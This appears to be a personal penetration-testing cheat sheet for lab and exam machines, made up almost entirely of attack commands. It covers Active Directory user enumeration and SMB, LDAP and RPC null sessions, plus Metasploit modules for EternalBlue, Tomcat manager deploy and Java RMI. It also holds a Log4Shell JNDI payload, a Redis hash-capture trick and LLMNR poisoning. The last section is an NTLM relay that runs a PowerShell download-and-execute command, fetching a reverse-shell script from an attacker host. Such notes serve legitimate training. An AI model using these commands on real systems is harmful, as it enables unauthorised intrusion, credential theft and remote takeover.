#### Find users
```bash
enum4linux -U 10.10.30.203  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

```bash
rpcclient -U "" -N 10.10.30.203
```
```rpcclient
enumdomusers
```

```bash
nxc smb 10.10.30.203 -u '' -p '' --users
```

```bash
ldapsearch -H ldap://10.10.30.203 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -d' ' -f2
```

```bash
windapsearch --dc-ip 10.10.30.203 -u "" -U
```

```bash
kerbrute userenum -d lab.enterprise.thm --dc 10.10.30.203 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

```
lookupsid.py lab.enterprise.thm/guest:''@lab.enterprise.thm | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
```

---
#### SMB, port 139/445
```bash
nxc smb 10.10.30.203 -u '' -p '' && nxc smb 10.10.30.203 -u 'guest' -p ''
```

```bash
smbclient -L \\10.10.30.203 -N
```
- null session/list shares
```
enum4linux -a -u "" -p "" <dc-ip> && enum4linux -a -u "guest" -p "" <ip>
```

```
smbmap -u "" -p "" -P 445 -H <ip> && smbmap -u "guest" -p "" -P 445 -H <ip>
```

```
smbclient -U '%' -L //<ip> && smbclient -U 'guest%' -L //<ip>
```

```bash
lookupsid.py oscp.exam/anonymous@10.129.235.244 -no-pass
```
- used anonymous because when enumerating smb anonymously can see shares with `smbclient -L <ip> -N`
- to remove everything before the `\` use vim command:
	- `:%s/^.*\\//`
- to remove everything after the first space
	- `:%s/ .*$//`
##### if READ access to IPC$ share, can rid-brute users
```
netexec smb 10.10.11.236 -u guest -p '' --rid-brute
```
##### misc nxc
```
nxc smb <ip> -u 'a' -p '' 
```
- testing for guest user access with random names
```
nxc smb <ip> --users
```
- list users

---
#### LDAP, port 389/636

```
ldapsearch -x -b "dc=hutch,dc=offsec" "user"  -H ldap://192.168.199.122 | grep dn
```
- check for users
- vim command to remove everything but names from output `:%s/^.*CN=\([^,]*\),.*$/\1/`
	- or try `:g/^dn: CN=\([^,]\+\),CN=Users,DC=hutch,DC=offsec$/s//\1/`
- vim command to reformat names with like first.last `:%s/^\(.*\) \([^ ]*\)$/\1.\2/`

```
ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://192.168.199.122 | grep description
```
- searches for descriptions

```
ldapsearch -x -b "dc=baby,dc=vl" "*"  -H ldap://10.10.88.213 | grep desc -A2
```
- searches for descriptions with more context)
##### misc
```
nmap -n -sV --script "ldap* and not brute" -p 389 <dc-ip>
```

```
ldapsearch -d 1 -x -H ldap://10.10.5.122 -b "dc=VULNNET"
```

---
#### RPC, port 135
```
rpcclient -N -U '' 10.129.184.54
```
- `enumdomusers`
```
net rpc group members 'Domain Users' -W '<domain>' -I '<ip>' -U '%'
```

---
#### RDP
```
xfreerdp /v:192.168.161.221 -sec-nla
```

---
#### TimeRoasting
Some service accounts with **logon as a batch job** or **scheduled task privileges** periodically request TGTs.
```
git clone https://github.com/Hackndo/TimeRoast.git
cd TimeRoast
python3 timeroast.py <dc_ip> -o timeroast_hashes.txt
```
- The tool extracts TGTs from local memory and outputs crackable hashes

---
#### DNS Zone Transfer & Subdomain Discovery
```
host -t ns <domain>
dig axfr <domain> @<nameserver>
```
alternatives:
```
dnsrecon -d <domain> -t axfr
dnsenum <domain>
```

```
dig +short sub.example.com
```

---
#### Eternal Blue
###### if smb message signing is disabled, either eternal blue or more likely ms09-050
```
nmap -p139,445 --script "smb-vuln*" 192.168.188.40
```
- test if vulnerable
	- if so:
```
msfconsole
search ms09-050
use 0
set LHOST <my ip>
set RHOSTS <victim ip>
run
```
- root shell
#### EternalBlue MS17-010 (only SMBv1)
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target_ip>
set LHOST <your_ip>
run
```

---
#### Tomcat/JBoss Manager
```
msfconsole
use auxiliary/scanner/http/tomcat_enum
run

use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS <target_ip>
set HttpUsername <user>
set HttpPassword <pass>
run
```

---
#### Java RMI
```
msfconsole
use exploit/multi/misc/java_rmi_server
set RHOSTS <target_ip>
set LHOST <your_ip>
run
```

---
#### Log4Shell
```
${jndi:ldap://<ip>:<port>/a}
```

---
#### MS SQL Database Enumeration
```
msfconsole
use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS <target_ip>
run
```

---
#### Redis NoSQL, Port 6379
```
redis-cli -h 10.10.246.197
```
- to retrieve all parameters from redis-cli, run ``CONFIG GET *``
```
smbserver.py smb share/ -smb2support 
```
```
eval "dofile('//10.21.90.250/share')" 0
```
![[Pasted image 20250404160719.png]]
- use kali ip
- get NTLM hash from responder
##### LFI
```
eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
```
![[Pasted image 20250404155241.png]]
- shows flag (LFI) 

---
Below is unclear if allowed on exam
---


#### Poisoning
###### #### LLMNR / NBTNS / MDNS (Listen for hashes)
```
sudo responder -I tun0
```
- make sure to enable SMB with `cat /usr/share/responder/Responder.conf | grep -i smb`
	- if Off, use `sudo sed -i "s/SMB = Off/SMB = On/" /usr/share/responder/Responder.conf` to turn it On
- also make sure http is on, same as above

###### NTLM Relay over SMB
```
sudo sed -i "s/SMB = On/SMB = Off/" /usr/share/responder/Responder.conf
```
- turn off smb in responder (so doesnt conflict with ntlmrelayx)
- switch back to On to re-enable afterwards  `sudo sed -i "s/SMB = Off/SMB = On/" /usr/share/responder/Responder.conf`
```
nxc smb 172.16.117.0/24 --gen-relay-list relayTargets.txt
```
- create list of IPs from subnet with smb signing disabled, so can be used to relay, saved as file relayTargets.txt in current directory
```
sudo responder -I tun0 
```
- start responder
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```
- output might show Administrator local SAM hash, if session relayed has privileged access on the target machine. if nothing useful in output, try command execution:
```
cp /home/daniel/Downloads/nishang-master/Shells/Invoke-PowerShellTcp.ps1 .
```
- copy Invoke-PowerShellTcp.ps1 to current directory
```
python3 -m http.server 8000
```
- serve Invoke-PowerShellTcp.ps1 on a http server
```
rlwrap -cAr nc -lnvp 7331
```
- catch the rev shell
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
```
- assumes my IP is 172.16.117.30

---